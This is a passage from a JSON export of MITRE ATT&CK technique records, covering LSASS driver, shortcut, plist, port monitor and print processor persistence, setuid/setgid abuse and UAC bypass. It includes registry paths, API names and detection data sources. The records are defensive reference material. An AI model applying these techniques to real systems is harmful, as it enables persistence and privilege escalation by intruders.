        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4",
    "platform": "windows",
    "tid": "T1547.008",
    "technique": "LSASS Driver",
    "tactic": "privilege-escalation",
    "datasources": "dll-monitoring|file-monitoring|loaded-dlls|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., <a href=\"https://attack.mitre.org/techniques/T1574\">Hijack Execution Flow</a>), an adversary can use LSA operations to continuously execute malicious payloads.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Security Subsystem",
        "url": "https://technet.microsoft.com/library/cc961760.aspx",
        "description": "Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft LSA Protection Mar 2014",
        "url": "https://technet.microsoft.com/library/dn408187.aspx",
        "description": "Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DLL Security",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx",
        "description": "Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179",
    "platform": "windows",
    "tid": "T1547.009",
    "technique": "Shortcut Modification",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/132.html",
        "description": "none",
        "external_id": "CAPEC-132"
      }
    ]
  },
  {
    "id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179",
    "platform": "windows",
    "tid": "T1547.009",
    "technique": "Shortcut Modification",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/132.html",
        "description": "none",
        "external_id": "CAPEC-132"
      }
    ]
  },
  {
    "id": "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe",
    "platform": "windows",
    "tid": "T1547.010",
    "technique": "Port Monitors",
    "tactic": "persistence",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <!-- raw HTML omitted -->AddMonitor<!-- raw HTML omitted --> API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <!-- raw HTML omitted -->C:\\Windows\\System32<!-- raw HTML omitted --> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors<!-- raw HTML omitted -->. <!-- raw HTML omitted --><!-- raw HTML omitted -->The Registry key contains entries for the following:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Local Port<!-- raw HTML omitted -->* Standard TCP/IP Port<!-- raw HTML omitted -->* USB Monitor<!-- raw HTML omitted -->* WSD Port<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.</p>\n",
    "technique_references": [
      {
        "source_name": "AddMonitor",
        "url": "http://msdn.microsoft.com/en-us/library/dd183341",
        "description": "Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Bloxham",
        "url": "https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf",
        "description": "Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe",
    "platform": "windows",
    "tid": "T1547.010",
    "technique": "Port Monitors",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <!-- raw HTML omitted -->AddMonitor<!-- raw HTML omitted --> API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <!-- raw HTML omitted -->C:\\Windows\\System32<!-- raw HTML omitted --> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors<!-- raw HTML omitted -->. <!-- raw HTML omitted --><!-- raw HTML omitted -->The Registry key contains entries for the following:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Local Port<!-- raw HTML omitted -->* Standard TCP/IP Port<!-- raw HTML omitted -->* USB Monitor<!-- raw HTML omitted -->* WSD Port<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.</p>\n",
    "technique_references": [
      {
        "source_name": "AddMonitor",
        "url": "http://msdn.microsoft.com/en-us/library/dd183341",
        "description": "Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Bloxham",
        "url": "https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf",
        "description": "Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a",
    "platform": "macos",
    "tid": "T1547.011",
    "technique": "Plist Modification",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by &lt; &gt;. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <!-- raw HTML omitted -->/Library/Preferences<!-- raw HTML omitted --> (which execute with elevated privileges) and <!-- raw HTML omitted -->~/Library/Preferences<!-- raw HTML omitted --> (which execute with a user’s privileges). <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.(Citation: Sofacy Komplex Trojan) <!-- raw HTML omitted --><!-- raw HTML omitted -->A specific plist used for execution at login is <!-- raw HTML omitted -->com.apple.loginitems.plist<!-- raw HTML omitted -->.(Citation: Methods of Mac Malware Persistence) Applications under this plist run under the logged in user’s context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.(Citation: Adding Login Items) Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to “hide” the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <!-- raw HTML omitted --> SMLoginItemSetEnabled<!-- raw HTML omitted --> can be used to set Login Items, but scripting languages like <a href=\"https://attack.mitre.org/techniques/T1059/002\">AppleScript</a> can do this as well. (Citation: Adding Login Items)</p>\n",
    "technique_references": [
      {
        "source_name": "Sofacy Komplex Trojan",
        "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
        "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Adding Login Items",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html",
        "description": "Apple. (2016, September 13). Adding Login Items. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX.Dok Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/",
        "description": "Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a",
    "platform": "macos",
    "tid": "T1547.011",
    "technique": "Plist Modification",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by &lt; &gt;. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <!-- raw HTML omitted -->/Library/Preferences<!-- raw HTML omitted --> (which execute with elevated privileges) and <!-- raw HTML omitted -->~/Library/Preferences<!-- raw HTML omitted --> (which execute with a user’s privileges). <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.(Citation: Sofacy Komplex Trojan) <!-- raw HTML omitted --><!-- raw HTML omitted -->A specific plist used for execution at login is <!-- raw HTML omitted -->com.apple.loginitems.plist<!-- raw HTML omitted -->.(Citation: Methods of Mac Malware Persistence) Applications under this plist run under the logged in user’s context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.(Citation: Adding Login Items) Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to “hide” the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <!-- raw HTML omitted --> SMLoginItemSetEnabled<!-- raw HTML omitted --> can be used to set Login Items, but scripting languages like <a href=\"https://attack.mitre.org/techniques/T1059/002\">AppleScript</a> can do this as well. (Citation: Adding Login Items)</p>\n",
    "technique_references": [
      {
        "source_name": "Sofacy Komplex Trojan",
        "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
        "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Adding Login Items",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html",
        "description": "Apple. (2016, September 13). Adding Login Items. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX.Dok Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/",
        "description": "Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
    "platform": "windows",
    "tid": "T1547.012",
    "technique": "Print Processors",
    "tactic": "persistence",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <!-- raw HTML omitted -->AddPrintProcessor<!-- raw HTML omitted --> API call with an account that has <!-- raw HTML omitted -->SeLoadDriverPrivilege<!-- raw HTML omitted --> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <!-- raw HTML omitted -->HKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\Driver<!-- raw HTML omitted --> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <!-- raw HTML omitted -->GetPrintProcessorDirectory<!-- raw HTML omitted --> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft AddPrintProcessor May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor",
        "description": "Microsoft. (2018, May 31). AddPrintProcessor function. Retrieved October 5, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ESET PipeMon May 2020",
        "url": "https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/",
        "description": "Tartare, M. et al. (2020, May 21). No “Game over” for the Winnti Group. Retrieved August 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
    "platform": "windows",
    "tid": "T1547.012",
    "technique": "Print Processors",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <!-- raw HTML omitted -->AddPrintProcessor<!-- raw HTML omitted --> API call with an account that has <!-- raw HTML omitted -->SeLoadDriverPrivilege<!-- raw HTML omitted --> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <!-- raw HTML omitted -->HKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\Driver<!-- raw HTML omitted --> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <!-- raw HTML omitted -->GetPrintProcessorDirectory<!-- raw HTML omitted --> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft AddPrintProcessor May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor",
        "description": "Microsoft. (2018, May 31). AddPrintProcessor function. Retrieved October 5, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ESET PipeMon May 2020",
        "url": "https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/",
        "description": "Tartare, M. et al. (2020, May 21). No “Game over” for the Winnti Group. Retrieved August 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9",
    "platform": "linux|macos",
    "tid": "T1548.001",
    "technique": "Setuid and Setgid",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an “s” instead of an “x” when viewing a file’s attributes via <!-- raw HTML omitted -->ls -l<!-- raw HTML omitted -->. The <!-- raw HTML omitted -->chmod<!-- raw HTML omitted --> program can set these bits with via bitmasking, <!-- raw HTML omitted -->chmod 4777 [file]<!-- raw HTML omitted --> or via shorthand naming, <!-- raw HTML omitted -->chmod u+s [file]<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this mechanism on their own malware to make sure they’re able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware).</p>\n",
    "technique_references": [
      {
        "source_name": "setuid man page",
        "url": "http://man7.org/linux/man-pages/man2/setuid.2.html",
        "description": "Michael Kerrisk. (2017, September 15). Linux Programmer's Manual. Retrieved September 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Keydnap malware",
        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9",
    "platform": "linux|macos",
    "tid": "T1548.001",
    "technique": "Setuid and Setgid",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.<!-- raw HTML omitted --><!-- raw HTML omitted -->Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an “s” instead of an “x” when viewing a file’s attributes via <!-- raw HTML omitted -->ls -l<!-- raw HTML omitted -->. The <!-- raw HTML omitted -->chmod<!-- raw HTML omitted --> program can set these bits with via bitmasking, <!-- raw HTML omitted -->chmod 4777 [file]<!-- raw HTML omitted --> or via shorthand naming, <!-- raw HTML omitted -->chmod u+s [file]<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this mechanism on their own malware to make sure they’re able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware).</p>\n",
    "technique_references": [
      {
        "source_name": "setuid man page",
        "url": "http://man7.org/linux/man-pages/man2/setuid.2.html",
        "description": "Michael Kerrisk. (2017, September 15). Linux Programmer's Manual. Retrieved September 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Keydnap malware",
        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
    "platform": "windows",
    "tid": "T1548.002",
    "technique": "Bypass User Account Control",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of <a href=\"https://attack.mitre.org/techniques/T1218/011\">Rundll32</a> to load a specifically crafted DLL which loads an auto-elevated <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)<!-- raw HTML omitted --><!-- raw HTML omitted -->Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->eventvwr.exe<!-- raw HTML omitted --> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)<!-- raw HTML omitted --><!-- raw HTML omitted -->Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet How UAC Works",
        "url": "https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works",
        "description": "Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Inside UAC",
        "url": "https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx",
        "description": "Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN COM Elevation",
        "url": "https://msdn.microsoft.com/en-us/library/ms679687.aspx",
        "description": "Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Davidson Windows",
        "url": "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html",
        "description": "Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Github UACMe",
        "url": "https://github.com/hfiref0x/UACME",
        "description": "UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 Fileless UAC Bypass",
        "url": "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/",
        "description": "Nelson, M. (2016, August 15). \"Fileless\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Fortinet Fareit",
        "url": "https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware",
        "description": "Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SANS UAC Bypass",
        "url": "http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass",
        "description": "Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 sdclt app paths",
